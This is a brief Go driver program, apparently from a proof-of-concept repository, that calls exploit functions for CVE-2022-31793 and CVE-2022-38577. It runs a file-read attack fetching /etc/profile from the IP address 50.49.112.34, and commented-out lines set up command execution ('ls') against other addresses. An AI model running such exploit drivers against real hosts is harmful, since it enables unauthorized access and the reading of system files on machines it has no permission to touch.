package main

import "go-test/poc/cve_2022_31793"

func main() {
	//cve_2022_38577.PocTest("10.10.10.75")
	////cve_2022_38577.PocTest("90.231.197.78")
	//
	//cfg := map[string]string{
	//	"AttackType": "cmd",
	//	"cmd":        "ls",
	//}
	//cve_2022_38577.ExpTest("10.10.10.75", cfg)

	cve_2022_31793.PocTest("50.49.112.34")

	cfg := map[string]string{
		"AttackType": "file",
		"file":       "/etc/profile",
	}

	cve_2022_31793.ExpTest("50.49.112.34", cfg)
}
